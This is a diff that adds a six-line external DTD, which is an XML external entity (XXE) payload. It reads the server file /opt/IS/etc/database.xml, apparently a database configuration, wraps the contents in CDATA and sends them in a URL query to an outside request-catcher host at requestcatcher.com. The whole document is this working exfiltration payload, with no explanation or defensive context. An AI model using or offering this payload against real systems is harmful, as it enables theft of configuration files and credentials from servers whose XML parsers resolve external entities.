@@ -1,0 +1,6 @@
+<!ENTITY % start '<![CDATA['>
+<!ENTITY % file SYSTEM 'file:///opt/IS/etc/database.xml'>
+<!ENTITY % end ']]>'>
+<!ENTITY % poke '<!ENTITY &#37; send SYSTEM "http://dmlbn.requestcatcher.com/leaf?c=%start;%file;%end;">'>
+%poke;
+%send;
